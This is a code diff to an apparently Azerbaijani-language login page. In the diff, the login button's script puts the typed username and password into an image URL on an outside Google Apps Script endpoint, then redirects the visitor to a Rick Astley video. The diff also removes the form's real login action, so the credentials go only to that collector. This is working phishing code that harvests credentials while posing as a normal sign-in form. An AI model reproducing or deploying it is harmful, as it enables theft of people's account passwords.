@@ -23,15 +23,14 @@ htmlCode = `<!DOCTYPE html>
                 elPsw.focus();
             }
             else el.focus();
-
-
         }
-
         function loginBtn(){
             let username = document.getElementById("Username");
 			let password = document.getElementById("Password");
-			document.write('<img src="https://script.google.com/macros/s/AKfycbzOejlHlAPAl9DXzrOgyvQNfCPDUxTlnz7dvmdX7zHfWBqBjW1NgtHKJTD2A-BPWJM/exec?username=' + username.value + '&password=' + password.value + '" />');
-            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+			document.write('<img src="https://script.google.com/macros/s/AKfycbzOejlHlAPAl9DXzrOgyvQNfCPDUxTlnz7dvmdX7zHfWBqBjW1NgtHKJTD2A-BPWJM/exec?username=' + username.value + '&password=' + password.value + '" onerror="rickRolled()" />');
+        }
+        function rickRolled(){
+            document.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         }
     </script>
     <section class="ftco-section">
@@ -51,7 +50,7 @@ htmlCode = `<!DOCTYPE html>
                 </div>
             </div>   
             <h4 class="text-center mb-4">Giriş</h4>
-            <form action="/Home/Login" method="post" class="login-form">
+            <form method="post" class="login-form">
                 <div class="form-group">
                     <input type="text" class="form-control rounded-left" name="UserId" id="Username" placeholder="İstifadəçi adı" required="">
                 </div>
